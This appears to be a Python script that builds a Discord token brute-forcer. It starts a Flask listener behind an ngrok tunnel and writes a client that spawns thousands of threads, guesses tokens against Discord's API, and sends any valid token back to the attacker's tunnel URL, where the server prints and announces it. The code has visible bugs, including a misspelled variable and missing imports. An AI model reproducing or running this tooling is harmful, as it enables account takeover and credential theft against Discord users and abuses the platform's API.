from flask import Flask, request
import ngrok
app = Flask(__name__)
tok = input("ngrok authtoken if you may: ")
def notif(title, message):
    notification.notify(
        title = title,
        message = message,
        )
@app.route('/a', methods=['POST'])
def main():
    t = request.form['token']
    print("TOKEN BRUTED MOTHER FUCKER")
    print(t)
    notif("Found it", t)
    return "", 200


ngrok.set_auth_token(tok)
ngrok = str(ngrok.connect(5000)).split(" ->")[0].split(" ")[1].replace('"', "")
endodeid = open("temp.txt", "r").read()
lines = ["import requests as req", "from threading import Thread as thr", "for i in range(10000):", f"thr(target = gen, args = ({encodedid})).start()',", "def gen(encodedid):", "  while True:", "    second = ('').join(random.choices(string.ascii_letters + string.digits + '-' + '_', k=6))", "    end = ('').join(random.choices(string.ascii_letters + string.digits + '-' + '_', k=27))", "    token = encodedid + '.' + second + '.' + end", "    headers = {'Content-Type': 'application/json', 'authorization': token}", "    url = 'https://discordapp.com/api/v6/users/@me/library'", "    r = req.get(url, headers=headers)", "    if r.status_code == 200:", "        print(token + ' Valid')", "        data = (('token', token))", f"        r = req.get({ngrok}, data=data)", "        exit(0)", "    else:", "        print(f'{token} Invalid')"]
open("client.py", "w").writelines(lines)
app.run(port=5000)
